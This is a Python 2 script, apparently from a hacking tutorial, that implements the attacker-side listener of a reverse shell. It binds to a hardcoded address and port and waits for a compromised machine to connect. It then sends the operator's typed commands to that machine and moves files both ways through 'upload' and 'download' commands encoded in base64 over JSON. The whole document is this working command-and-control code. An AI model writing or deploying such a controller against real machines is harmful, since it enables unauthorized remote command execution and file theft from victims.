#!/usr/bin/env python

import json
import socket
import base64


def write_file(path, content):
    with open(path, 'wb') as file:
        file.write(base64.b64decode(content))


def read_file(path):
    with open(path, 'rb') as file:
        return base64.b64encode(file.read())


class Listener:

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # if we lose connection, we should be able to reestablish
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connection")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        """
        It keeps on appending to json_data until it receives the full data
        :return: string
        """
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_command(self, command):
        self.reliable_send(command)
        if command[0] == 'exit':
            self.connection.close()
            exit()

        return self.reliable_receive()

    def run(self):
        while True:
            command = raw_input("$-: ")
            command = command.split(" ")

            try:
                if command[0] == 'upload':
                    command.append(read_file(command[1]))

                result = self.execute_command(command)

                if command[0] == 'download':
                    write_file(command[1], result)

            except Exception:
                result = "[+] error encountered during command execution"

            print(result)


my_listener = Listener("192.168.225.95", 8888)
my_listener.run()
